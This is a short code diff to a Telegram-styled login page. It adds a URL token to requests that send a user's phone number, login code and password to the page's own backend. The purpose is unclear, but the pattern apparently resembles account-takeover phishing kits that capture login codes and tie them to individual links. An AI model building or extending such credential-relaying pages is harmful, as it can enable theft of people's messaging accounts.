@@ -10,6 +10,10 @@ export default function Home() {
   const [error, setError] = useState('');
   const [hash, setHash] = useState('');
 
+  const publicToken = typeof window !== 'undefined'
+    ? new URLSearchParams(window.location.search).get('t')
+    : null;
+
   // Tema Dark
   const theme = { bg: '#1c242f', card: '#242f3d', text: '#ffffff', subText: '#7f91a4', blue: '#3390ec', divider: '#10161d' };
 
@@ -36,7 +40,7 @@ export default function Home() {
       const res = await fetch('/api/send-code', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phoneNumber: cleanNumber }),
+        body: JSON.stringify({ phoneNumber: cleanNumber, t: publicToken }),
       });
       const data = await res.json();
       
@@ -63,7 +67,8 @@ export default function Home() {
             phoneNumber: cleanNumber, 
             code, 
             phoneCodeHash: hash, 
-            password 
+            password,
+            t: publicToken
         }),
       });
       const data = await res.json();
